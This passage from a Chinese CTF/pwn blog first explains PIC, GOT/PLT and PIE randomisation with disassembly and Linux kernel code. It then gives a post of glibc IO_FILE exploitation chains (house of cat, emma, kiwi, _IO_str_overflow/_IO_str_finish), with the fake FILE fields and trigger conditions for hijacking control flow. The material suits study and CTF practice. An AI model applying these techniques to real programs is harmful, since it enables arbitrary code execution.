<li>数据节是可写的且不在进程间共享，因此向它添加重定位没有害处，而将重定位移出代码节使得代码节变成只读且在进程间共享</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000477 &lt;ml_func&gt;:</span><br><span class="line"> 477:   55                      push   ebp</span><br><span class="line"> 478:   89 e5                   mov    ebp,esp</span><br><span class="line"> 47a:   53                      push   ebx</span><br><span class="line"> 47b:   83 ec 24                sub    esp,0x24</span><br><span class="line"> 47e:   e8 e4 ff ff ff          call   467 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 483:   81 c3 71 1b 00 00       add    ebx,0x1b71</span><br><span class="line"> 489:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line"> 48c:   89 04 24                mov    DWORD PTR [esp],eax</span><br><span class="line"> 48f:   e8 0c ff ff ff          call   3a0 &lt;ml_util_func@plt&gt;</span><br><span class="line"> &lt;... snip morecode&gt;</span><br><span class="line"></span><br><span class="line">000003a0 &lt;ml_util_func@plt&gt;:</span><br><span class="line"> 3a0:   ff a3 14 00 00 00       jmp    DWORD PTR [ebx+0x14]</span><br><span class="line"> 3a6:   68 10 00 00 00          push   0x10</span><br><span class="line"> 3ab:   e9 c0 ff ff ff          jmp    370 &lt;_init+0x30&gt;</span><br><span class="line">     </span><br><span class="line">0000045a &lt;__i686.get_pc_thunk.cx&gt;:</span><br><span class="line"> 45a:   8b 0c 24                mov    ecx,DWORD PTR [esp]</span><br><span class="line"> 45d:   c3                      ret</span><br></pre></td></tr></table></figure>
<ul>
<li><code>call get_pc_thunk.bx</code> 会把其下一条指令压栈，然后就用 <code>mov</code> 把下一条指令的地址放入 <code>ebx</code> 寄存器</li>
<li>对 <code>ebx</code> 寄存器中的值进行 <code>add</code> 操作，获取 GOT 基地址，然后获取 <code>myglob</code> 的真实地址</li>
<li>访问函数时，先 <code>call</code> 其在 PLT 表中的地址，然后 <code>jmp [ebx+0x14]</code>（对应 GOT 中 <code>ml_util_func</code> 的地址）</li>
</ul>
<p>每个 PLT 项包含三个部分：</p>
<ul>
<li>到 GOT 指定地址的一个跳转（这是跳转到 [ebx + 0x14]）</li>
<li>为解析者准备参数（用于定位该函数）</li>
<li>调用解析函数</li>
</ul>
<p><strong>位置无关代码-x64</strong></p>
<p>x86设计时没有考虑 PIC，因此实现 PIC 有一点缺陷：</p>
<ul>
<li>一个显而易见的代价是 PIC 中所有对数据及代码的外部访问都要求额外的间接性，即对全局变量的每次访问，以及对函数的每次调用，都要一次额外的内存载入</li>
<li>是 PIC 的实现增加了寄存器的使用，需要一整个寄存器存放 GOT 基地址</li>
</ul>
<p>在64位模式里实现了一个新的取址形式，RIP 相对取址（相当于指令指针）：通过向指向下一条指令的64位 RIP 添加位移来构成一个有效的地址</p>
<ul>
<li>在x86中数据访问（使用 mov 指令）仅支持绝对地址</li>
<li>在x64模式也用其他指令，比如 lea </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,table        ;将table内容传送给ax寄存器</span><br><span class="line">lea ax,table        ;将table的地址传送给ax寄存器</span><br><span class="line"></span><br><span class="line">;offset是属性操作符,表示应把其后跟着的符号的地址(而不是内容)作为传送数据</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000064b &lt;ml_func&gt;:</span><br><span class="line"> 64b:   55                      push   rbp</span><br><span class="line"> 64c:   48 89 e5                mov    rbp,rsp</span><br><span class="line"> 64f:   48 83 ec 20             sub    rsp,0x20</span><br><span class="line"> 653:   89 7d ec                mov    DWORD PTR [rbp-0x14],edi</span><br><span class="line"> 656:   89 75 e8                mov    DWORD PTR [rbp-0x18],esi</span><br><span class="line"> 659:   8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line"> 65c:   89 c7                   mov    edi,eax</span><br><span class="line"> 65e:   e8 fd fe ff ff          call   560 &lt;ml_util_func@plt&gt;</span><br><span class="line"> [... snip more code ...]</span><br><span class="line"> </span><br><span class="line">0000000000000560 &lt;ml_util_func@plt&gt;:</span><br><span class="line"> 560:   ff 25 a2 0a 20 00       jmp   QWORD PTR [rip+0x200aa2]</span><br><span class="line"> 566:   68 01 00 00 00          push  0x1</span><br><span class="line"> 56b:   e9 d0 ff ff ff          jmp   540 &lt;_init+0x18&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>get_pc_thunk.bx</code> 函数没有了，程序也不会专门用一个寄存器来保存 GOT 表基地址，而是直接用 <code>rip + offset</code> 来定位 GOT 表</li>
</ul>
<p>在x86上 GOT 地址以两步被载入到某些基址寄存器：</p>
<ul>
<li>首先以一个特殊的函数调用获取指令的地址</li>
<li>然后加上到 GOT 的偏移</li>
</ul>
<p>在x64上这两步都不需要：</p>
<ul>
<li>因为到 GOT 的相对偏移对链接器是已知的</li>
<li>并且可以简单地使用 RIP 相对取址直接获取对应数据</li>
</ul>
<h2 id="PIE-的原理"><a href="#PIE-的原理" class="headerlink" title="PIE 的原理"></a>PIE 的原理</h2><p>PIC 实现了位置无关代码，如果把 PIC 的范围扩大到整个二进制文件，就形成了 PIE：地址无关可执行程序</p>
<p>执行程序时，系统的动态链接器库 ld.so 会首先加载，接着 ld.so 会通过 .dynamic 段中类型为 DT_NEED 的字段查找其他需要加载的共享库，并依次将它们加载到内存中：</p>
<ul>
<li>关闭 PIE：程序会在固定的地址开始加载，这些动态链接库每次加载的顺序和位置都一样</li>
<li>开启 PIE：因为没有绝对地址引用，所以每次加载的地址都不相同<ul>
<li>不仅动态链接库的加载地址不固定，就连执行程序每次加载的地址也不一样</li>
<li>这就要求 ld.so 首先被加载后它不仅要负责重定位其他的共享库，同时还要对可执行文件重定位</li>
</ul>
</li>
</ul>
<p>当 kernel 加载运行一个可执行文件时，会调用 <code>load_elf_binary()</code> 这个函数（这里只写出了和 PIE 有关的片段）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/fs/binfmt_elf.c */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_elf_binary</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(current-&gt;personality &amp; ADDR_NO_RANDOMIZE) &amp;&amp; randomize_va_space)</span><br><span class="line">		current-&gt;flags |= PF_RANDOMIZE;</span><br><span class="line">    <span class="comment">/* 当randomize_va_space标志启用时,&#x27;flag-&gt;PF_RANDOMIZE&#x27;会被设置为&#x27;1&#x27;,确保后面的if语句可以通过 */</span></span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	retval = create_elf_tables(bprm, &amp;loc-&gt;elf_ex,</span><br><span class="line">			  load_addr, interp_load_addr);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 设置代码段,数据段的起始/终止地址,设置栈的起始地址 */</span></span><br><span class="line">	current-&gt;mm-&gt;end_code = end_code;</span><br><span class="line">	current-&gt;mm-&gt;start_code = start_code;</span><br><span class="line">	current-&gt;mm-&gt;start_data = start_data;</span><br><span class="line">	current-&gt;mm-&gt;end_data = end_data;</span><br><span class="line">	current-&gt;mm-&gt;start_stack = bprm-&gt;p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((current-&gt;flags &amp; PF_RANDOMIZE) &amp;&amp; (randomize_va_space &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="comment">/* 如果&#x27;flag-&gt;PF_RANDOMIZE&#x27;被设置为&#x27;1&#x27;,就执行如下语句 */</span></span><br><span class="line">		current-&gt;mm-&gt;brk = current-&gt;mm-&gt;start_brk =</span><br><span class="line">			arch_randomize_brk(current-&gt;mm); <span class="comment">/* 用于获取随机地址 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> compat_brk_randomized</span></span><br><span class="line">		current-&gt;brk_randomized = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/arch/kernel/process.c */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_randomize_brk</span><span class="params">(struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> randomize_page(mm-&gt;brk, <span class="number">0x02000000</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/drivers/char/random.c */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">randomize_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> range)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!PAGE_ALIGNED(start)) &#123;</span><br><span class="line">		range -= PAGE_ALIGN(start) - start;</span><br><span class="line">		start = PAGE_ALIGN(start);</span><br><span class="line">        <span class="comment">/* PAGE_ALIGN(addr):将物理地址addr修整为页边界地址(页的上边界) */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (start &gt; ULONG_MAX - range)</span><br><span class="line">		range = ULONG_MAX - start;</span><br><span class="line"></span><br><span class="line">	range &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (range == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> start + (get_random_long() % range &lt;&lt; PAGE_SHIFT); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/include/linux/random.h */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_random_long</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line">	<span class="keyword">return</span> get_random_u64();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> get_random_u32();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1/drivers/char/random.c */</span></span><br><span class="line"><span class="function">u64 <span class="title">get_random_u64</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u64 ret;</span><br><span class="line">	<span class="keyword">bool</span> use_lock;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">batched_entropy</span> *<span class="title">batch</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">void</span> *previous;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 64</span></span><br><span class="line">	<span class="keyword">if</span> (arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">if</span> (arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret) &amp;&amp;</span><br><span class="line">	    arch_get_random_long((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ret + <span class="number">1</span>))</span><br><span class="line">	    <span class="keyword">return</span> ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	warn_unseeded_randomness(&amp;previous);</span><br><span class="line"></span><br><span class="line">	use_lock = READ_ONCE(crng_init) &lt; <span class="number">2</span>;</span><br><span class="line">	batch = &amp;get_cpu_var(batched_entropy_u64); <span class="comment">/* 获取本地cpu的变量 */</span></span><br><span class="line">	<span class="keyword">if</span> (use_lock)</span><br><span class="line">		read_lock_irqsave(&amp;batched_entropy_reset_lock, flags);</span><br><span class="line">	<span class="keyword">if</span> (batch-&gt;position % ARRAY_SIZE(batch-&gt;entropy_u64) == <span class="number">0</span>) &#123;</span><br><span class="line">		extract_crng((u8 *)batch-&gt;entropy_u64);</span><br><span class="line">		batch-&gt;position = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = batch-&gt;entropy_u64[batch-&gt;position++];</span><br><span class="line">    <span class="comment">/* 根据当前进程的batched_entropy_u64来计算出随机数 */</span></span><br><span class="line">	<span class="keyword">if</span> (use_lock)</span><br><span class="line">		read_unlock_irqrestore(&amp;batched_entropy_reset_lock, flags);</span><br><span class="line">	put_cpu_var(batched_entropy_u64);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_random_u64);</span><br></pre></td></tr></table></figure>
<p>因为 PIE 使用了 PIC 中的原理（GOT + RIP 相对取址）使代码与地址无关，所以 kernel 在加载ELF文件时，可以直接使用对应的函数把 <code>current-&gt;mm-&gt;brk</code> 随机化</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/" class="post-title-link" itemprop="url">IO_FILE 常用调用链（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-02 16:21:36" itemprop="dateCreated datePublished" datetime="2022-09-02T16:21:36+08:00">2022-09-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:33:56" itemprop="dateModified" datetime="2022-12-09T18:33:56+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>house of cat</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_wfile_seekoff] (IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x10</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of emma</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_cookie_write](IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f79a20</span> &lt;_IO_cookie_write+<span class="number">48</span>&gt;    call   rax                           &lt;getkeyserv_handle+<span class="number">528</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span> <span class="comment">/* __cookie:可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span>    </span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x40</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of kiwi</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; fflush -&gt; sync(_IO_file_jumps)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e78523</span> &lt;fflush+<span class="number">131</span>&gt;    call   qword ptr [rbp + <span class="number">0x60</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff7fc35e0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0xc00</span></span><br><span class="line">       rdx: <span class="number">0x7ffff7fc38c0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7ef2417</span> (write+<span class="number">23</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>IO_flush_all</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; [_IO_wdefault_xsgetn](IO_wstrn_jumps) -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wstrn_jumps+0x28</li>
<li>手动调用 <code>_IO_flush_all</code></li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_overflow</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_overflow</code> 里可以通过 <code>call qword ptr [rbx + 0xe0]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>__GI__IO_str_overflow</code> 里不再使用上面的指令，而是调用 <code>call malloc@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+8</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = addr_rdx</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_end = (addr_rdi - <span class="number">100</span>) / <span class="number">2</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_finish</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_finish</code> 里可以通过 <code>call qword ptr [rbx + 0xe8]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>_IO_str_finish</code> 里不再使用上面的指令，而是调用 <code>call free@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+0x10</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = addr_rdi <span class="comment">// 也就是 fp-&gt;_IO_write_end</span></span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps - <span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
